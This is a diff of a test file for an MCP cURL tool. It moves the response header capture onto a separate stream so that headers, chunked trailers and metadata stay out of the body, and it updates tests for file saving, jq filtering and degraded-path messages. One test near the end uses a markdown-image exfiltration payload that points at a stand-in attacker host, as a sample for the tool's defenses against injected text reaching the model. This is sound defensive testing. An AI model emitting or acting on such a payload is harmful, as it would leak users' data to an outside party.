@@ -48,18 +48,23 @@ const mockedExecuteCommand = executionModule.executeCommand as Mock;
 /**
  * Build cURL output as the real executor hands it back.
  *
- * Takes Buffers so a test can put non-UTF-8 bytes on the wire, and reports
- * `%{size_header}` as the true WIRE byte count — which is the whole point: a
- * string-only helper computes the count from the same re-encoding it indexes,
- * so it can never catch an offset that is measured in a different
- * representation from the one it is applied to.
+ * The header block goes on its OWN field, never onto stdout, because that is
+ * what cURL does once `--dump-header` points at a descriptor. A helper that
+ * concatenated them would let a test pass against a handler that had gone back
+ * to inferring the boundary.
+ *
+ * Takes Buffers so a test can put non-UTF-8 bytes on either stream.
  */
 function stdoutFor(headerBlock: Buffer | string, body: Buffer | string, contentType: string) {
     const h = Buffer.isBuffer(headerBlock) ? headerBlock : Buffer.from(headerBlock, "utf8");
     const b = Buffer.isBuffer(body) ? body : Buffer.from(body, "utf8");
-    const meta = Buffer.from(`${SEP}${h.length} ${contentType}`, "utf8");
-    const stdoutBytes = Buffer.concat([h, b, meta]);
-    return { stdout: stdoutBytes.toString("utf8"), stdoutBytes, stderr: "", exitCode: 0 };
+    const meta = Buffer.from(`${SEP}${contentType}`, "utf8");
+    return {
+        stdoutBytes: Buffer.concat([b, meta]),
+        headerBytes: h.length > 0 ? h : undefined,
+        stderr: "",
+        exitCode: 0,
+    };
 }
 
 /** Parse through the real schema so tests exercise the true input shape. */
@@ -202,10 +207,11 @@ describe("curl_execute include_headers — boundary fidelity", () => {
     beforeEach(() => vi.clearAllMocks());
 
     it("keeps the body intact when a header carries non-UTF-8 bytes", () => {
-        // cURL counts WIRE bytes. Decoding stdout first turns each invalid byte
-        // into U+FFFD (3 bytes for 1), so a string-indexed split lands early and
-        // glues the header terminator onto the body — the very corruption this
-        // feature exists to remove, reintroduced by the fix for it.
+        // Kept from the era when a wire byte count was indexed into lossily
+        // decoded stdout (RC-2): an invalid byte became U+FFFD, three bytes for
+        // one, and the split landed early. The streams are separate now so no
+        // offset can drift — this asserts the property still holds, and would
+        // fail again the moment anything reintroduced a shared stream.
         const headerBytes = Buffer.concat([
             Buffer.from("HTTP/2 200 \r\ncontent-type: application/json\r\nx-name: caf"),
             Buffer.from([0xe9]),
@@ -235,8 +241,8 @@ describe("curl_execute include_headers — boundary fidelity", () => {
 
     it("still splits and still strips behind a long remote-chosen Content-Type", async () => {
         // A legal Content-Type this long used to evict the metadata separator
-        // from a fixed window. Every curl-authored field then read as absent, so
-        // the split silently did nothing AND the strip stages were deselected.
+        // from a fixed window, at which point the strip stages were silently
+        // deselected on an ordinary reply.
         const longCt =
             'text/markdown; charset=utf-8; profile="' + "x".repeat(300) + '"';
         const headers =
@@ -275,22 +281,30 @@ describe("curl_execute include_headers — boundary fidelity", () => {
     });
 });
 
-describe("curl_execute include_headers — degraded paths stay honest", () => {
+describe("curl_execute include_headers — no header block arrived", () => {
     beforeEach(() => vi.clearAllMocks());
 
-    /** stdout whose metadata block is unreachable, so the boundary is undetermined. */
-    function undeterminedStdout(headers: string, body: string) {
-        const bytes = Buffer.from(headers + body, "utf8");
-        return { stdout: bytes.toString("utf8"), stdoutBytes: bytes, stderr: "", exitCode: 0 };
+    /** A well-formed response on which cURL wrote no header block at all. */
+    function withoutHeaders(body: string, contentType = "application/json") {
+        return {
+            stdoutBytes: Buffer.concat([
+                Buffer.from(body, "utf8"),
+                Buffer.from(`${SEP}${contentType}`, "utf8"),
+            ]),
+            headerBytes: undefined,
+            stderr: "",
+            exitCode: 0,
+        };
     }
 
-    it("refuses save_to_file when the header boundary is undetermined", async () => {
-        // The body still has the header block on it. Writing that to disk is the
-        // corruption this feature exists to remove, and six documents promise it
-        // cannot happen — so the promise is kept by refusing, not by writing.
-        mockedExecuteCommand.mockResolvedValue(
-            undeterminedStdout("HTTP/2 200 \r\nx: 1\r\n\r\n", '{"id":1}')
-        );
+    // The mirror of the two tests below. `save_to_file` and `jq_filter` used to
+    // be REFUSED here, because the header block could still be on the front of
+    // the body and writing it to disk was the corruption this feature exists to
+    // remove. cURL writes the body to its own stream now, so there is nothing to
+    // refuse — and asserting the refusal is gone is what stops it being
+    // reinstated as a "safety" measure that only costs the caller a feature.
+    it("saves to file even though no header block arrived", async () => {
+        mockedExecuteCommand.mockResolvedValue(withoutHeaders('{"id":1}'));
 
         const result = await executeCurlRequest(params({
             url: "https://example.test/x",
@@ -298,30 +312,41 @@ describe("curl_execute include_headers — degraded paths stay honest", () => {
             save_to_file: true,
         }));
 
-        expect(result.isError).toBe(true);
-        expect(result.content[0].text).toMatch(/boundary could not be determined/i);
+        expect(result.isError).toBeUndefined();
     });
 
-    it("refuses jq_filter when the header boundary is undetermined", async () => {
-        mockedExecuteCommand.mockResolvedValue(
-            undeterminedStdout("HTTP/2 200 \r\nx: 1\r\n\r\n", '{"id":1}')
-        );
+    it("filters with jq even though no header block arrived", async () => {
+        mockedExecuteCommand.mockResolvedValue(withoutHeaders('{"id":1}'));
 
         const result = await executeCurlRequest(params({
             url: "https://example.test/x",
             include_headers: true,
             jq_filter: ".id",
+            include_metadata: true,
         }));
 
-        expect(result.isError).toBe(true);
+        expect(result.isError).toBeUndefined();
+        expect(JSON.parse(result.content[0].text).response).toContain("1");
     });
 
-    it("signals an undetermined boundary on the plain (non-metadata) branch", async () => {
+    it("reports that headers were asked for and none came back", async () => {
+        mockedExecuteCommand.mockResolvedValue(withoutHeaders('{"id":1}'));
+
+        const result = await executeCurlRequest(params({
+            url: "https://example.test/x",
+            include_headers: true,
+            include_metadata: true,
+        }));
+
+        const parsed = JSON.parse(result.content[0].text);
+        expect(parsed.headers_undetermined).toBe(true);
+        expect(parsed.headers).toBeUndefined();
+    });
+
+    it("signals it on the plain (non-metadata) branch too", async () => {
         // The plain branch carries no JSON fields, so silence here made a
         // degraded result byte-identical to a good one.
-        mockedExecuteCommand.mockResolvedValue(
-            undeterminedStdout("HTTP/2 200 \r\nx: 1\r\n\r\n", "body")
-        );
+        mockedExecuteCommand.mockResolvedValue(withoutHeaders("body", "text/plain"));
 
         const result = await executeCurlRequest(params({
             url: "https://example.test/x",
@@ -329,8 +354,83 @@ describe("curl_execute include_headers — degraded paths stay honest", () => {
         }));
 
         expect(result.content[0].text).toContain("[mcp-curl]");
-        expect(result.content[0].text).toContain("boundary undetermined");
+        expect(result.content[0].text).toContain("none were received");
+        // And it must not claim the body is contaminated: it cannot be.
+        expect(result.content[0].text).not.toMatch(/NOT separated/i);
     });
+});
+
+describe("curl_execute include_headers — the streams stay separate", () => {
+    beforeEach(() => vi.clearAllMocks());
+
+    // RC-17: `%{size_header}` does not count chunked trailers, which `curl -i`
+    // wrote to stdout AFTER the body — so trailer text landed inside `response`.
+    // cURL writes trailers to the header dump, so this is now structural.
+    it("keeps a chunked trailer out of the body", async () => {
+        const headers =
+            "HTTP/1.1 200 OK\r\ncontent-type: text/plain\r\n" +
+            "transfer-encoding: chunked\r\ntrailer: x-leak\r\n\r\n" +
+            "x-leak: TRAILER_TEXT_HERE\r\n";
+        mockedExecuteCommand.mockResolvedValue(stdoutFor(headers, "HELLO", "text/plain"));
+
+        const result = await executeCurlRequest(params({
+            url: "https://example.test/chunked",
+            include_headers: true,
+            include_metadata: true,
+        }));
+
+        const parsed = JSON.parse(result.content[0].text);
+        expect(parsed.response).toBe("HELLO");
+        expect(parsed.response).not.toContain("TRAILER_TEXT_HERE");
+        expect(parsed.headers).toContain("x-leak: TRAILER_TEXT_HERE");
+    });
+
+    // The wiring contract: the descriptor is opened exactly when cURL is told
+    // to write to it. Without this, dropping `captureHeaders` leaves a green
+    // suite in which every header request reports "none received".
+    it("asks the executor to open the header descriptor", async () => {
+        mockedExecuteCommand.mockResolvedValue(stdoutFor("HTTP/2 200 \r\n\r\n", "ok", "text/plain"));
+
+        await executeCurlRequest(params({
+            url: "https://example.test/x",
+            include_headers: true,
+        }));
+
+        expect(mockedExecuteCommand).toHaveBeenCalledWith(
+            "curl", expect.any(Array), expect.any(Number), { captureHeaders: true }
+        );
+    });
+
+    it("does not open it when headers were not asked for", async () => {
+        mockedExecuteCommand.mockResolvedValue(stdoutFor("", "ok", "text/plain"));
+
+        await executeCurlRequest(params({ url: "https://example.test/x" }));
+
+        expect(mockedExecuteCommand).toHaveBeenCalledWith(
+            "curl", expect.any(Array), expect.any(Number), { captureHeaders: false }
+        );
+    });
+});
+
+describe("curl_execute include_headers — remaining channels", () => {
+    beforeEach(() => vi.clearAllMocks());
+
+    /**
+     * stdout carrying no `-w` metadata block at all.
+     *
+     * Distinct from "no header block arrived" above: this is the case where
+     * every cURL-authored field is missing, which selects the STRICTEST
+     * grammar. Conflating the two is exactly what `metadataFound` exists to
+     * prevent.
+     */
+    function noMetadataStdout(body: string) {
+        return {
+            stdoutBytes: Buffer.from(body, "utf8"),
+            headerBytes: undefined,
+            stderr: "",
+            exitCode: 0,
+        };
+    }
 
     it("defends cURL stderr, which reaches the model with no pipeline of its own", async () => {
         // Under `verbose` stderr carries the origin's own response headers.
@@ -354,7 +454,7 @@ describe("curl_execute include_headers — degraded paths stay honest", () => {
         // it as JSON and drops the strip stages. Only a parse can tell a real
         // JSON document from attacker text wearing a bracket.
         const payload = "[![x](https://evil.test/?d=stolen)]";
-        mockedExecuteCommand.mockResolvedValue(undeterminedStdout("", payload));
+        mockedExecuteCommand.mockResolvedValue(noMetadataStdout(payload));
 
         const result = await executeCurlRequest(params({
             url: "https://example.test/x",
@@ -370,10 +470,10 @@ describe("curl_execute include_headers — degraded paths stay honest", () => {
         // The strictest-grammar posture is for the model; processResponse writes
         // the POST-strip content to disk, so applying it to a JSON body silently
         // rewrites the artefact jq_query later reads back.
-        // No `-i` without include_headers, so stdout is the body alone; the
-        // metadata block is what is unreachable here.
+        // stdout is always the body alone now; the metadata block is what is
+        // unreachable here.
         const body = '{"note":"see [docs](https://example.com/x)"}';
-        mockedExecuteCommand.mockResolvedValue(undeterminedStdout("", body));
+        mockedExecuteCommand.mockResolvedValue(noMetadataStdout(body));
 
         const result = await executeCurlRequest(params({
             url: "https://example.test/x",
